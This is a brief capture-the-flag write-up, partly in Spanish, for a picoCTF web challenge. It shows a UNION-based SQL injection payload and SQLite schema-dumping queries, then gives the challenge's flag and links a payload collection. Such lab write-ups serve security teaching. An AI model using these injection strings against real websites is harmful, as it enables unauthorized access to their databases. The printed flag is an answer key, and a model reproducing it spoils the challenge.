## Descripción 
Can you find the flag on this website.

Try to find the flag [here](http://saturn.picoctf.net:56832/).
## Solución 
```
hola' union select 1,2,tbl_name FROM sqlite_master;

Extract Database Structure`SELECT sql FROM sqlite_schema`
`SELECT sql FROM sqlite_master`
`SELECT tbl_name FROM sqlite_master WHERE type='table'`
```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}
## Notas adicionales 
* Se puede acceder a la base de datos si el programador se deja un pequeño fallo en el que explores completamente toda la base de datos 
## Referencias
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md